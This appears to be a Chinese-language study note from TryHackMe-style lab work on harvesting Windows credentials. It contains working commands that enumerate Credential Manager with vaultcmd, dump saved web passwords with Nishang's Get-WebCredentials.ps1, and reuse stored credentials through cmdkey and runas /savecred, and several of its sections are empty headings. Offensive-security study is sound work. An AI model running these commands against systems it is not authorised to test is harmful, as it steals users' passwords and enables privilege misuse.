# 凭据收集

## 本地Windows凭据

### 键盘记录器

详见THM Exploiting AD （Task 5）


### SAM

### Metasploit 的 HashDump

### 卷影复制服务


## Windows 凭据管理器

凭据管理器是一项 Windows 功能，用于存储网站、应用程序和网络的登录敏感信息。它包含登录凭证，例如用户名、密码和 Internet 地址。有四个凭证类别：

Web 凭证包含存储在 Internet 浏览器或其他应用程序中的身份验证详细信息。
Windows 凭证包含 Windows 身份验证详细信息，例如 NTLM 或 Kerberos。
通用凭证包含基本身份验证详细信息，例如明文用户名和密码。
基于证书的凭据：这些是基于证书的身份验证详细信

### 访问

列出 Credentials Manager 中的可用凭证：
```
vaultcmd /list
```

检查 “Web Credentials” 中是否有任何存储的凭证：
```
VaultCmd /listproperties:"Web Credentials"
```

列出 “Web 凭据” 的凭据详细信息:
```
VaultCmd /listcreds:"Web Credentials"
```

### 凭据转储

VaultCmd 无法显示密码，但我们可以依赖其他 PowerShell 脚本，例如 Get-WebCredentials.ps1.
https://github.com/samratashok/nishang/blob/master/Gather/Get-WebCredentials.ps1

```powershell
PS C:\Users\Administrator> Import-Module C:\Tools\Get-WebCredentials.ps1
PS C:\Users\Administrator> Get-WebCredentials
```

### RunAs

利用存储的凭证的另一种方法是使用 RunAs。RunAs 是一个命令行内置工具，允许在不同用户的权限下运行 Windows 应用程序或工具。RunAs 工具具有可在 Windows 系统中使用的各种命令参数。/savecred该参数允许您将用户的凭证保存在 Windows 凭证管理器中（在 Windows 凭证部分下）。因此，下次我们以同一用户身份执行时，runas 不会要求输入密码。

枚举存储的 Windows 凭据
```
cmdkey /list
```

使用 /savecred 参数以用户身份运行 CMD.exe
```
runas /savecred /user:THM.red\thm-local cmd.exe
```

